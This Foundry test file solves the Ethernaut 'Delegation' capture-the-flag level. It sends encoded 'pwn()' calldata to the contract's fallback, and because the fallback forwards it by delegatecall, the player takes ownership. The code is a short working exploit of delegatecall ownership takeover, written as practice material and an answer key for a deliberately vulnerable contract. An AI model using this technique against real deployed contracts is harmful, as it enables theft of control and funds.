// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {Delegation} from "src/levels/Delegation.sol";
import {DelegationFactory} from "src/levels/DelegationFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestDelegationSolution is Test, Utils {
    Ethernaut ethernaut;
    Delegation instance;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        DelegationFactory factory = new DelegationFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = Delegation(createLevelInstance(ethernaut, Level(address(factory)), 0));
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.prank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public {

        // goal: claim the ownership of the contract

        // the ownership of Delegation contract can be claimed by triggering
        // fallback function by sending 0 ethereum and a msg.data with the encoded function we want to call

        vm.startPrank(player);
        // this will call pwn() function which(i think) intends to set the owner as the msg sender which should be the Delegation contract.
        // but msg sender in delegate calls actually keeps the original msg.sender which is player address.
        address(instance).call{value: 0}(abi.encodeWithSignature("pwn()"));

        console.log(instance.owner());
        
        // i'm not lying 
        assertEq(instance.owner(), player);
    }
}